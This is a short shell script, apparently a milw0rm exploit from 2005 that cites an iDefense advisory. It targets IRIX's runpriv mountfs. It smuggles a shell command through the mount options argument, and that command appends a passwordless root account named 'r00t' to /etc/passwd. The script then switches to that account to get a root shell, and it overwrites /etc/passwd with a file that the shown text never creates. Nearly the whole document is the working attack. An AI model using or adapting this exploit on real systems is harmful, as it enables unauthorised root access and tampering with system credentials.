#!/bin/sh
# Advisory: http://www.idefense.com/intelligence/vulnerabilities/display.php?id=312

/usr/sysadm/bin/runpriv mountfs -s test -d / -o |
  "ksh -c 'echo r00t::0:0:r00t:/tmp:/bin/sh >> /etc/passwd'"
su r00t -c "chown root:sys /tmp/passwd123 ;
mv /tmp/passwd123 /etc/passwd ;
chmod 644 /etc/passwd ; su" 

# milw0rm.com [2005-10-10]
